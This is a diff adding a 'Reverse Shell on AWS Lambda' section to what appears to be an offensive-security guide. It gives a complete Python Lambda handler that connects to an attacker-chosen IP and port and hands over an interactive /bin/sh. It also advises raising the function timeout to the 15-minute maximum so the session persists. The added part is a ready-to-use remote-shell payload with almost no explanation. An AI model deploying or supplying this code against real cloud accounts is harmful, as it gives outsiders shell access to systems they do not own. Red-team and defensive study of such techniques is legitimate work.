@@ -35,6 +35,34 @@ If you're in an environment that restricts security groups that match 0.0.0.0/0,
 128.0.0.0/1
 ```
 
+### Reverse Shell on AWS Lambda
+
+Run the attacker command as above.
+
+Then create the Python Lambda function with the code below. NOTE: You have to adjust the Lambda timeout config to much longer, like 15 minutes (the max).
+
+```python
+import json
+import socket
+import subprocess
+import os
+
+def lambda_handler(event, context):
+    ip_address = event.get('ip')
+    port = event.get('port', 1337)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_address, port))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p = subprocess.call(["/bin/sh","-i"])
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Hello from Lambda!')
+    }
+
+```
+
 ### Reverse Shell in GitHub Actions
 
 ```
